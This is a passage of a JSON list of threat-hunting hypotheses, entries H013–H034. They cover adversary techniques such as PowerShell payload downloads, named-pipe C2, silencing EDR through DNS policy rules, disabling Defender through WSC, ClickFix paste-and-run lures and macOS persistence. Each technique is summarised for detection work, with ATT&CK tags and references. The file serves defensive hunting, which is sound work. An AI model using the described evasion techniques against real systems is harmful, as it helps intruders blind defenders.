    "notes": "Below are key implementation notes to guide this process: <br></br>1. Sysmon Configuration<br></br>Event ID 1 (Process Creation): Configure Sysmon to capture detailed information about process creations, focusing on powershell.exe executions. Ensure that command-line arguments are logged to detect potentially malicious scripts or commands.<br></br>Event ID 4104 (PowerShell Script Block Logging): While Sysmon does not natively capture PowerShell script block logging, enabling this feature in PowerShell settings can provide visibility into the content of executed scripts. This requires configuring PowerShell to log detailed script blocks to the Windows Event Log.<br></br>2. Detection Logic and Filtering<br></br>Baseline Normal Activity: Establish a baseline of normal PowerShell usage within the environment to differentiate between legitimate administrative activities and potential malicious behavior.<br></br>Anomaly Detection: Develop detection rules to identify anomalies, such as unusual command-line arguments, execution times, or user contexts that deviate from the established baseline.<br></br>Filtering Noise: Apply filters to exclude known legitimate PowerShell activities to reduce false positives and focus on suspicious events.<br></br>Limitations and Assumptions<br></br>Encrypted or Obfuscated Scripts: Attackers may use obfuscation or encryption to evade detection. Regularly update detection mechanisms to recognize and alert on such techniques.",
    "tags": [
      "powershell",
      "sysmon",
      "execution",
      "ta0002",
      "T1059.001"
    ],
    "techniques": [
      "T1059.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Siddhant Mishra",
      "link": "https://www.linkedin.com/in/siddhant-mishra-b190b630/"
    },
    "why": "- Detecting unauthorized PowerShell script execution using Sysmon significantly enhances an organization's security posture by providing detailed visibility into potentially malicious activities\n- Sysmon's comprehensive logging capabilities enable the identification of suspicious PowerShell commands, such as the use of DownloadFile methods to retrieve malicious payloads or obfuscated scripts designed to evade detection\n- By monitoring these activities, security teams can promptly detect and respond to threats, preventing unauthorized code execution, data exfiltration, or further system compromise. Implementing such monitoring is crucial for maintaining system integrity and safeguarding against sophisticated attack vectors that leverage PowerShell's extensive functionalities.",
    "references": "- https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon\n- https://techcommunity.microsoft.com/blog/microsoftsentinelblog/the-power-of-data-collection-rules-monitoring-powershell-usage/4236527\n- https://www.blumira.com/blog/sysmon-benefits",
    "file_path": "Flames/H013.md"
  },
  {
    "id": "H014",
    "category": "Flames",
    "title": "An adversary is leveraging Windows named pipes to establish covert command-and-control (C2) channels, enabling lateral movement and maintaining persistence within the network. Named pipes, a common interprocess communication (IPC) mechanism in Windows, can be abused to facilitate stealthy data exchange between compromised systems.",
    "tactic": "Command and Control",
    "notes": "<ul> <li>Named Pipes as C2 Channels: Named pipes are inter-process communication mechanisms in Windows environments. Adversaries exploit them to create covert C2 channels, enabling stealthy communication between compromised systems.</li><br><li>Detection Strategy: Monitor Sysmon Event ID 17 (Pipe Creation) for the creation of suspicious named pipes. Correlate these events with process creation logs (Event ID 1) to identify unusual parent-child process relationships, which may indicate malicious activity.</li><br><li>Reference List: Utilize a curated list of named pipes commonly associated with adversary techniques to aid in identifying potential threats.</li></br>",
    "tags": [
      "cobaltstrike",
      "namedpipes",
      "commandandcontrol",
      "sysmon",
      "threathunting",
      "T1559",
      "T1090"
    ],
    "techniques": [
      "T1559",
      "T1090"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Siddhant Mishra",
      "link": "https://github.com/Blackbird2Raven"
    },
    "why": "- Detecting Cobalt Strike's use of named pipes for command-and-control (C2) communication significantly enhances an organization's ability to identify and mitigate sophisticated adversary activities.\n- By monitoring Sysmon Event IDs 17 and 18, which log pipe creation and access events, security teams can pinpoint the establishment of covert C2 channels that utilize named pipes - a technique often employed by Cobalt Strike for lateral movement and persistence.\n- This proactive detection approach enables early identification of malicious activities, facilitating timely response actions to prevent unauthorized access, data exfiltration, and further compromise within the network.\n- Implementing such detection mechanisms is crucial for maintaining robust security defenses against advanced persistent threats leveraging tools like Cobalt Strike.",
    "references": "- https://medium.com/@siddhantalokmishra/my-recent-journey-in-detecting-cobalt-strike-3f66eb00189c\n- https://www.cobaltstrike.com/blog/named-pipe-pivoting",
    "file_path": "Flames/H014.md"
  },
  {
    "id": "H015",
    "category": "Flames",
    "title": "Adversaries are redirecting DNS queries to an inappropriate or false DNS server IP, effectively blocking legitimate communications and potentially compromising the security infrastructure.",
    "tactic": "Defense Evasion",
    "notes": "<ul> <li><strong>Assumptions:</strong></li><ul><li>If done with local admin right, the attack creates new registry values in the registry key HKLM\\System\\CurrentControlSet\\Services\\Dnscache\\Parameters\\DnsPolicyConfig{UUID</li><li>Value of registry key listed upper contains a domain related to a cybersecurity tool, such as .endpoint.security.microsoft.com</li><li>Add-DnsClientNrptRule Powershell function can be used to reach such purpose</ul></li><li><strong>Data Requirements:</strong><ul><li>Works only on Windows 7 and later operating systems</li><li>Requires to log registry key changes and/or any way to log command execution</ul></li><li><strong>Notes on Limitation:</strong><ul><li>Defenders must have multiple ways to log registry key changes and/or command execution to detect the attack once it was executed by attacker, as it aims to silence cybersecurity tool(s)</ul></li></ul>",
    "tags": [
      "registry",
      "edr",
      "dns",
      "defenseevasion",
      "T1562.001",
      "T1112"
    ],
    "techniques": [
      "T1562.001",
      "T1112"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "wikijm",
      "link": "https://github.com/wikijm"
    },
    "why": "- What security risks or threats does this hunt address?\n    - Identifying attempts by an attacker to disable cybersecurity tools by disrupting the communication between security agents and their management console.\n- What are the potential impacts if malicious activity is found?\n   - Compromised Security Posture: Redirecting DNS queries can prevent security agents from communicating with their management consoles, leaving the network vulnerable to further attacks.\n   - Data Breach: Without proper monitoring, attackers could exfiltrate sensitive data undetected.\n   - Operational Disruption: Critical systems may be disrupted if they rely on the compromised DNS resolution for their operations.\n   - Compliance Violations: Failure to detect and mitigate such threats could lead to non-compliance with regulatory standards, resulting in fines or legal consequences.\n   - Reputation Damage: A successful attack could harm the organization's reputation, leading to loss of customer trust and potential financial losses.\n- How does this hunt connect to known threat campaigns or protect critical assets?\n    - Known Threat Campaigns: DNS redirection tactics have been used in various advanced persistent threat (APT) campaigns to evade detection and maintain persistence within compromised networks.\n    - Critical Asset Protection: By ensuring that security agents can communicate with their management consoles, this hunt helps protect critical assets such as sensitive data, intellectual property, and essential services.\n    - Proactive Defense: Identifying and mitigating DNS redirection attempts proactively strengthens the overall security posture, making it harder for attackers to gain a foothold.\n- Why would this hunt be valuable to the community?\n    - Shared Knowledge: Sharing detection methods and indicators of compromise (IOCs) helps other organizations improve their defenses against similar threats.\n    - Collaborative Defense: By collaborating on threat hunting, the community can collectively enhance its ability to detect and respond to emerging threats.\n    - Best Practices: Establishing best practices for detecting and mitigating DNS redirection attacks benefits the entire community, raising the baseline for cybersecurity standards.\n    - Innovation: Encourages the development of new tools and techniques to counter evolving threats, driving innovation in cybersecurity.",
    "references": "- MITRE ATT&CK References\n    - Impair Defenses: Disable or Modify Tools - https://attack.mitre.org/techniques/T1562/001/\n- Blog Posts or Articles\n    - EDR Silencers and Beyond: Exploring Methods to Block EDR Communication - Part 1 - https://cloudbrothers.info/edr-silencers-exploring-methods-block-edr-communication-part-1/",
    "file_path": "Flames/H015.md"
  },
  {
    "id": "H016",
    "category": "Flames",
    "title": "Adversaries are using compromised SonicWall VPN credentials to gain initial access to corporate networks.",
    "tactic": "Initial Access",
    "notes": "Based on ATT&CK technique T1078, using compromised credentials.",
    "tags": [
      "initialaccess",
      "sonicwall",
      "T1078"
    ],
    "techniques": [
      "T1078"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "HEARTH Bot",
      "link": "https://github.com/THORCollective/HEARTH"
    },
    "why": "- Detecting the use of compromised VPN credentials is critical as it is often the first step in an attack chain, allowing adversaries to gain a foothold in the network.\n- If this technique succeeds, adversaries can gain access to the internal network, potentially bypassing perimeter defenses and giving them the ability to move laterally, escalate privileges, or perform other malicious activities.\n- This specific implementation is tied to larger campaigns by the Fog ransomware group, which has been observed using compromised VPN credentials for initial access in multiple incidents.\n- The use of compromised SonicWall VPN credentials was chosen over other techniques mentioned in the CTI due to its actionability (evident in VPN logs), impact (directly enables adversary objectives), uniqueness (distinctive of this specific threat), and detection gap (commonly missed by security tools).",
    "references": "- [MITRE ATT&CK technique T1078 - Valid Accounts](https://attack.mitre.org/techniques/T1078/)\n- [Navigating Through The Fog](https://thedfirreport.com/2025/04/28/navigating-through-the-fog/)",
    "file_path": "Flames/H016.md"
  },
  {
    "id": "H017",
    "category": "Flames",
    "title": "Adversaries are exploiting memory safety issues in the Apache mod_lua module to execute arbitrary code with elevated privileges on Apache web servers.",
    "tactic": "Privilege Escalation",
    "notes": "Based on ATT&CK technique T1068, using CVE-2021-44790",
    "tags": [
      "privilegeescalation",
      "exploit",
      "apache",
      "T1068"
    ],
    "techniques": [
      "T1068"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "HEARTH Bot",
      "link": "https://github.com/THORCollective/HEARTH"
    },
    "why": "- Detecting this precise behavior is crucial as it allows adversaries to gain elevated privileges, potentially giving them full control over the compromised Apache web server.\n- If this specific technique succeeds, adversaries can execute arbitrary code with high privileges, leading to further system compromise, data theft, or disruption of services.\n- This specific implementation ties to larger campaigns as it allows adversaries to compromise web servers, which can be used as a stepping stone to infiltrate the internal network or to host malicious content.\n- This technique was chosen over others mentioned in the CTI due to its high impact (arbitrary code execution with elevated privileges) and its actionability, as exploitation attempts can be detected in web server logs.",
    "references": "- [MITRE ATT&CK technique T1068](https://attack.mitre.org/techniques/T1068/)\n- [Security Vulnerabilities Study in Software Extensions and Plugins](https://eunomia.dev/blog/2025/02/10/security-vulnerabilities-study-in-software-extensions-and-plugins/)",
    "file_path": "Flames/H017.md"
  },
  {
    "id": "H018",
    "category": "Flames",
    "title": "Threat actors are exploiting insecure serverless functions in AWS, Azure, and Google Cloud to compromise serverless tokens, leading to privilege escalation and potential data exfiltration.",
    "tactic": "Credential Access",
    "notes": "Based on ATT&CK technique T1098, using serverless functions to compromise credentials.",
    "tags": [
      "credentialaccess",
      "serverlessfunctions",
      "cloud",
      "T1098"
    ],
    "techniques": [
      "T1098"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "HEARTH Bot",
      "link": "https://github.com/THORCollective/HEARTH"
    },
    "why": "- Detecting this behavior is crucial as it can lead to unauthorized access to sensitive data and systems in the cloud environment.\n- If successful, the threat actors can escalate their privileges, potentially gaining full control over the cloud environment and enabling them to exfiltrate sensitive data.\n- This technique has been observed in larger campaigns targeting cloud environments, indicating a broader threat landscape.",
    "references": "- [MITRE ATT&CK T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/)\n- [Palo Alto Networks - Serverless Security](https://www.paloaltonetworks.com/cortex/secure-serverless)\n- [Source CTI Report](https://unit42.paloaltonetworks.com/serverless-authentication-cloud/)",
    "file_path": "Flames/H018.md"
  },
  {
    "id": "H019",
    "category": "Flames",
    "title": "Threat actors are leveraging Linux Executable and Linkage Format (ELF) files to deploy malware families on cloud infrastructure endpoints running Linux OS, with the immediate tactical goal of gaining unauthorized access and maintaining persistence.",
    "tactic": "Persistence, Initial Access",
    "notes": "Based on ATT&CK technique T1204 (User Execution), using ELF files.",
    "tags": [
      "persistence",
      "initialaccess",
      "userexecution",
      "elf",
      "T1204"
    ],
    "techniques": [
      "T1204"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "HEARTH Bot",
      "link": "https://github.com/THORCollective/HEARTH"
    },
    "why": "- Detecting the use of ELF files to deploy malware is critical as it signifies a targeted attack on Linux-based cloud infrastructure, which is widely used in enterprise environments.\n- The tactical impact of a successful attack includes unauthorized access to cloud infrastructure, potential data breaches, and the ability for the threat actor to maintain persistence within the compromised system.\n- This behavior could be linked to larger campaigns targeting cloud infrastructure, given the increasing trend of threat actors weaponizing ELF files.",
    "references": "- [MITRE ATT&CK User Execution](https://attack.mitre.org/techniques/T1204/)\n- [Unit 42 CTI Report](https://unit42.paloaltonetworks.com/)\n- [Source CTI Report](https://unit42.paloaltonetworks.com/elf-based-malware-targets-cloud/)",
    "file_path": "Flames/H019.md"
  },
  {
    "id": "H020",
    "category": "Flames",
    "title": "Threat actors are using the Windows Management Instrumentation (WMI) system to execute PowerShell commands that establish a reverse shell, allowing them to gain remote control over Windows servers in the financial sector.",
    "tactic": "Execution",
    "notes": "Based on ATT&CK technique T1047, using WMI for execution of PowerShell commands.",
    "tags": [
      "execution",
      "wmi",
      "T1047"
    ],
    "techniques": [
      "T1047"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "HEARTH Bot",
      "link": "https://github.com/THORCollective/HEARTH"
    },
    "why": "- Detecting this behavior is crucial as it allows threat actors to gain control over critical systems, potentially leading to data theft, system disruption, or further lateral movement within the network.\n- If successful, the threat actors can manipulate the compromised system to their advantage, potentially leading to significant financial and reputational damage for the targeted organization.\n- This technique has been linked to larger campaigns targeting the financial sector, indicating a strategic focus on high-value targets.",
    "references": "- [MITRE ATT&CK T1047](https://attack.mitre.org/techniques/T1047/)\n- [Source CTI Report](https://www.huntress.com/blog/inside-bluenoroff-web3-intrusion-analysis)",
    "file_path": "Flames/H020.md"
  },
  {
    "id": "H021",
    "category": "Flames",
    "title": "Threat actors are using the undocumented Windows Security Center (WSC) APIs to register a fabricated antivirus product, effectively disabling Windows Defender and creating an environment conducive for subsequent malware deployment and execution.",
    "tactic": "Defense Evasion",
    "notes": "Based on ATT&CK technique T1562.001, using the undocumented Windows Security Center (WSC) APIs",
    "tags": [
      "defenseevasion",
      "wsc",
      "T1562.001"
    ],
    "techniques": [
      "T1562.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "HEARTH Bot",
      "link": "https://github.com/THORCollective/HEARTH"
    },
    "why": "- Detecting this behavior is crucial as it allows threat actors to disable Windows Defender, one of the primary security solutions on Windows systems, thereby significantly lowering the barrier for subsequent malware deployment and execution.\n- If successful, this technique can lead to a compromised system, data breaches, and potential lateral movement within the network.\n- This technique has been associated with the tool \"defendnot\", which represents a sophisticated approach to bypassing Windows Defender.",
    "references": "- [MITRE ATT&CK T1562.001](https://attack.mitre.org/techniques/T1562/001/)\n- [Source CTI Report](https://www.huntress.com/blog/defendnot-detecting-malicious-security-product-bypass-techniques)",
    "file_path": "Flames/H021.md"
  },
  {
    "id": "H022",
    "category": "Flames",
    "title": "Threat actors are using social engineering tactics to convince targets to set up application specific passwords (ASPs), then obtaining these 16-character passcodes to establish persistent access to the victim's Google Mail accounts.",
    "tactic": "Credential Access",
    "notes": "Based on ATT&CK technique T1110. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "credentialaccess",
      "socialengineering",
      "T1110"
    ],
    "techniques": [
      "T1110"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Lauren Proehl",
      "link": "https://x.com/jotunvillur"
    },
    "why": "- Detecting this behavior is important as it allows threat actors to gain persistent access to a victim's email account, potentially leading to the compromise of sensitive information.\n- The success of this tactic can lead to further exploitation of the compromised account, including the potential for lateral movement within an organization.\n- This behavior has been linked to state-sponsored cyber threat actors, indicating a high level of sophistication and potential impact.",
    "references": "- [MITRE ATT&CK T1110 - Brute Force](https://attack.mitre.org/techniques/T1110/)\n- [Source CTI Report](https://cloud.google.com/blog/topics/threat-intelligence/creative-phishing-academics-critics-of-russia)",
    "file_path": "Flames/H022.md"
  },
  {
    "id": "H023",
    "category": "Flames",
    "title": "Threat actors are using the 'attrib +h' command to hide files and directories in the compromised Windows system to maintain stealth and evade detection.",
    "tactic": "Defense Evasion",
    "notes": "Based on ATT&CK technique T1564. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "defenseevasion",
      "attribcommand",
      "T1564"
    ],
    "techniques": [
      "T1564"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- Detecting the use of 'attrib +h' command is crucial as it is a common technique used by adversaries to hide their tracks and maintain persistence. \n- Successful evasion can lead to long-term compromise, leading to data exfiltration, lateral movement, or further attacks.\n- This behavior might be linked to larger campaigns, where the adversary uses a variety of stealth techniques for defense evasion.",
    "references": "- [MITRE ATT&CK T1564](https://attack.mitre.org/techniques/T1564/)\n- [Source CTI Report](https://www.huntress.com/blog/inside-bluenoroff-web3-intrusion-analysis)",
    "file_path": "Flames/H023.md"
  },
  {
    "id": "H024",
    "category": "Flames",
    "title": "Threat actors are using the ClickFix social engineering technique to trick users into copying and pasting malicious PowerShell commands into their system's run dialog, resulting in the execution of the GHOSTPULSE loader and subsequent deployment of the ARECHCLIENT2 info-stealer on the victim's system.",
    "tactic": "Initial Access",
    "notes": "Based on ATT&CK technique T1566.001 (Phishing: Spearphishing Link). Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "initialaccess",
      "phishing",
      "spearphishinglink",
      "T1566.001",
      "T1204.002"
    ],
    "techniques": [
      "T1566.001",
      "T1204.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- Detecting this behavior is crucial as it allows threat actors to gain initial access to the system, bypassing many traditional perimeter defenses.\n- If successful, the threat actors can deploy the GHOSTPULSE loader and the ARECHCLIENT2 info-stealer, leading to potential data theft and unauthorized remote control over the compromised system.\n- This technique has been linked to a larger campaign involving the deployment of various malware and info-stealers, indicating a widespread and ongoing threat.",
    "references": "- [MITRE ATT&CK: T1566.001 - Phishing: Spearphishing Link](https://attack.mitre.org/techniques/T1566/001/)\n- [Source CTI Report](https://www.elastic.co/security-labs/a-wretch-client)",
    "file_path": "Flames/H024.md"
  },
  {
    "id": "H025",
    "category": "Flames",
    "title": "Threat actors are using a Python-based remote access trojan (RAT) called \"PylangGhost\" to target Windows systems of employees with experience in cryptocurrency and blockchain technologies. The actors trick users into downloading the trojan by creating fake job interview sites and instructing users to copy, paste, and execute a command to allegedly install required video drivers.",
    "tactic": "Initial Access, Execution",
    "notes": "Based on ATT&CK technique T1204.002 and T1059.006. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "initialaccess",
      "execution",
      "userexecution",
      "commandandscriptinginterpreter",
      "T1204.002",
      "T1059.006"
    ],
    "techniques": [
      "T1204.002",
      "T1059.006"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- Detecting this behavior is crucial as it allows threat actors to gain initial access to the target system and execute commands remotely, leading to potential data theft or further system compromise.\n- The successful execution of this technique can lead to the compromise of sensitive information related to cryptocurrency and blockchain technologies, which can have significant financial implications.\n- This technique is part of a larger campaign by the threat actor group Famous Chollima, which has been very active and is known for its well-documented campaigns.",
    "references": "- [MITRE ATT&CK User Execution](https://attack.mitre.org/techniques/T1204/002/)\n- [MITRE ATT&CK Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/006/)\n- [Source CTI Report](https://blog.talosintelligence.com/python-version-of-golangghost-rat/)",
    "file_path": "Flames/H025.md"
  },
  {
    "id": "H026",
    "category": "Flames",
    "title": "Threat actors are using Windows' built-in command-line tool, 'cipher.exe', with the '/w' option to overwrite free space on the victim's hard drive partitions, hindering forensic recovery of deleted files after deploying the CyberLock ransomware.",
    "tactic": "Defense Evasion",
    "notes": "Based on ATT&CK technique T1070.004. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "defenseevasion",
      "cipher_exe",
      "T1070.004"
    ],
    "techniques": [
      "T1070.004"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- Detecting this behavior is crucial as it allows threat actors to cover their tracks and make it more difficult for incident response teams to analyze the attack.\n- If successful, this tactic can significantly impede the ability of defenders to understand the full scope of an attack, potentially leading to incomplete remediation efforts.\n- This behavior has been observed in conjunction with the deployment of the CyberLock ransomware, indicating it may be part of larger, coordinated campaigns.",
    "references": "- [MITRE ATT&CK T1070.004](https://attack.mitre.org/techniques/T1070/004/)\n- [Source CTI Report](https://blog.talosintelligence.com/fake-ai-tool-installers/)",
    "file_path": "Flames/H026.md"
  },
  {
    "id": "H027",
    "category": "Flames",
    "title": "BlueNoroff threat actors are delivering malicious AppleScript files (.scpt) via fake Zoom domains with oversized files containing >10,000 blank lines to mask malicious payload delivery for initial access into cryptocurrency organizations.",
    "tactic": "Initial Access",
    "notes": "Based on ATT&CK technique T1566.002. BlueNoroff campaign targeting Web3 organizations using deepfake meetings and fake Zoom extensions.",
    "tags": [
      "initialaccess",
      "applescript",
      "bluenoroff",
      "T1566.002"
    ],
    "techniques": [
      "T1566.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- Detecting this behavior is crucial as AppleScript provides native system access and can bypass many security controls when delivered through social engineering.\n- If successful, this tactic allows threat actors to establish initial foothold on macOS systems in high-value cryptocurrency organizations.\n- This behavior has been observed in BlueNoroff's sophisticated social engineering campaigns using deepfake technology and impersonation of legitimate meeting platforms.",
    "references": "- [MITRE ATT&CK T1566.002](https://attack.mitre.org/techniques/T1566/002/)\n- [Source CTI Report](https://www.huntress.com/blog/inside-bluenoroff-web3-intrusion-analysis)",
    "file_path": "Flames/H027.md"
  },
  {
    "id": "H028",
    "category": "Flames",
    "title": "Sophisticated threat actors are querying display state using system_profiler before executing malicious commands to avoid detection when users are actively using their systems.",
    "tactic": "Defense Evasion",
    "notes": "Based on ATT&CK technique T1497.003. Using display state awareness to time malicious activities when users are away from their systems.",
    "tags": [
      "defenseevasion",
      "evasion",
      "macos",
      "T1497.003"
    ],
    "techniques": [
      "T1497.003"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- Detecting this behavior is crucial as display state awareness indicates sophisticated operational security and intent to avoid user detection.\n- If successful, this tactic allows threat actors to execute malicious activities when users are away, reducing the likelihood of discovery.\n- This behavior demonstrates advanced understanding of user behavior patterns and sophisticated evasion techniques.",
    "references": "- [MITRE ATT&CK T1497.003](https://attack.mitre.org/techniques/T1497/003/)\n- [Source CTI Report](https://www.huntress.com/blog/inside-bluenoroff-web3-intrusion-analysis)",
    "file_path": "Flames/H028.md"
  },
  {
    "id": "H029",
    "category": "Flames",
    "title": "Advanced threat actors are leveraging debugger entitlements and task_for_pid API calls to perform process injection on macOS systems, deploying malicious payloads into legitimate processes.",
    "tactic": "Defense Evasion",
    "notes": "Based on ATT&CK technique T1055. Using debugger entitlements for process injection with task_for_pid and mach_vm APIs on macOS.",
    "tags": [
      "defenseevasion",
      "processinjection",
      "macos",
      "T1055"
    ],
    "techniques": [
      "T1055"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- Detecting this behavior is crucial as process injection allows malicious code to execute within legitimate processes, evading many security controls.\n- If successful, this tactic enables threat actors to hide malicious activity within trusted processes and potentially inherit their privileges.\n- This behavior is rare on macOS outside of legitimate development scenarios, making it a high-value detection opportunity.",
    "references": "- [MITRE ATT&CK T1055](https://attack.mitre.org/techniques/T1055/)\n- [Source CTI Report](https://www.huntress.com/blog/inside-bluenoroff-web3-intrusion-analysis)",
    "file_path": "Flames/H029.md"
  },
  {
    "id": "H030",
    "category": "Flames",
    "title": "Threat actors are establishing persistence on macOS systems using LaunchDaemons that impersonate legitimate messaging services (like \"Telegram2\") but execute malicious binaries from non-standard locations.",
    "tactic": "Persistence",
    "notes": "Based on ATT&CK technique T1543.004. Creating LaunchDaemon persistence using legitimate service names with suspicious execution paths.",
    "tags": [
      "persistence",
      "launchdaemon",
      "macos",
      "T1543.004"
    ],
    "techniques": [
      "T1543.004"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- Detecting this behavior is crucial as LaunchDaemon persistence provides automatic execution at system startup with elevated privileges.\n- If successful, this tactic ensures threat actor access survives system reboots and provides a reliable mechanism for maintaining presence.\n- This behavior demonstrates sophisticated understanding of macOS persistence mechanisms while attempting to blend in with legitimate services.",
    "references": "- [MITRE ATT&CK T1543.004](https://attack.mitre.org/techniques/T1543/004/)\n- [Source CTI Report](https://www.huntress.com/blog/inside-bluenoroff-web3-intrusion-analysis)",
    "file_path": "Flames/H030.md"
  },
  {
    "id": "H031",
    "category": "Flames",
    "title": "Threat actors are systematically enumerating and extracting sensitive data from cryptocurrency wallet browser extensions to support financial theft operations.",
    "tactic": "Collection",
    "notes": "Based on ATT&CK technique T1005. Automated collection of cryptocurrency wallet data from browser extensions including MetaMask, Phantom, Keplr, and others.",
    "tags": [
      "collection",
      "cryptocurrency",
      "bluenoroff",
      "T1005"
    ],
    "techniques": [
      "T1005"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- Detecting this behavior is crucial as cryptocurrency wallet harvesting directly supports BlueNoroff's primary financial theft objectives.\n- If successful, this tactic can lead to significant financial losses through unauthorized access to cryptocurrency accounts and private keys.\n- This behavior indicates targeting of high-value cryptocurrency assets and may be part of larger financial crime operations.",
    "references": "- [MITRE ATT&CK T1005](https://attack.mitre.org/techniques/T1005/)\n- [Source CTI Report](https://www.huntress.com/blog/inside-bluenoroff-web3-intrusion-analysis)",
    "file_path": "Flames/H031.md"
  },
  {
    "id": "H032",
    "category": "Flames",
    "title": "Threat actors are using AppleScript to download and execute malicious payloads, bypassing network detections by using legitimate websites like Zoom as C2 infrastructure.",
    "tactic": "Defense Evasion",
    "notes": "Based on ATT&CK technique T1059.002. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "defense_evasion",
      "command_and_scripting_interpreter",
      "applescript",
      "malware",
      "T1059.002"
    ],
    "techniques": [
      "T1059.002"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- AppleScript can be abused to download and execute malicious code on macOS systems\n- Using trusted domains like Zoom for C2 helps evade network detection of the malicious traffic\n- Enables threat actors to gain an initial foothold and deploy further malware on the system",
    "references": "- https://attack.mitre.org/techniques/T1059/002/  \n- [Inside the BlueNoroff Web3 macOS Intrusion Analysis](https://www.huntress.com/blog/inside-bluenoroff-web3-intrusion-analysis)",
    "file_path": "Flames/H032.md"
  },
  {
    "id": "H033",
    "category": "Flames",
    "title": "Threat actors are using PowerShell's Invoke-RestMethod cmdlet to download ransomware payloads from recently registered low-reputation domains to encrypt files and demand payment.",
    "tactic": "Execution, Impact",
    "notes": "Based on ATT&CK technique T1059.001. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "execution",
      "command_and_scripting_interpreter",
      "powershell",
      "ransomware",
      "T1059.001"
    ],
    "techniques": [
      "T1059.001"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- The CTI report mentions ransomware like DragonForce and Medusa being deployed after gaining access via SimpleHelp RMM software\n- Detecting the specific delivery mechanism of ransomware can help disrupt attacks before encryption and impact occurs\n- PowerShell is a common tool used by threat actors to download and execute malicious payloads while blending in with legitimate admin activity\n- Recently registered, low-reputation domains are often used to host initial payloads to avoid detection by domain/IP reputation lists",
    "references": "- https://attack.mitre.org/techniques/T1059/001/\n- [Source CTI Report](https://dispatch.thorcollective.com/p/from-the-fire-q1fy25)",
    "file_path": "Flames/H033.md"
  },
  {
    "id": "H034",
    "category": "Flames",
    "title": "Threat actors are using IDE plugins like \"Remote Code Runner\" or \"REST Client\" to launch unauthorized shells, scripts, or network connections from trusted developer tools such as VS Code, PyCharm, or Eclipse to enable persistence, C2 beaconing, or lateral movement on developer endpoints.",
    "tactic": "Persistence, Lateral Movement",
    "notes": "Based on ATT&CK technique T1546.016. Generated by [hearth-auto-intel](https://github.com/THORCollective/HEARTH).",
    "tags": [
      "persistence",
      "lateral_movement",
      "ide_plugin",
      "event_triggered_execution",
      "T1546.016"
    ],
    "techniques": [
      "T1546.016"
    ],
    "severity": null,
    "status": "current",
    "related_hunt_ids": [],
    "submitter": {
      "name": "Sydney Marrone",
      "link": "https://www.linkedin.com/in/sydneymarrone/"
    },
    "why": "- IDE plugins have extensive access and can execute code, spawn processes, and make network connections\n- Malicious plugins can abuse this trust to persist, move laterally, or establish C2 channels\n- Developers are high-value targets, so compromising their tooling enables access to source code and sensitive systems\n- Plugin-based attacks often blend in with legitimate dev activity and may be missed by standard detections",
    "references": "- https://attack.mitre.org/techniques/T1546/016/\n- [Your Plugins and Extensions Are (Probably) Fine. Hunt Them Anyway.](https://dispatch.thorcollective.com/p/your-plugins-and-extensions-are-probably-fine)",
    "file_path": "Flames/H034.md"
  },
  {
    "id": "H035",
    "category": "Flames",
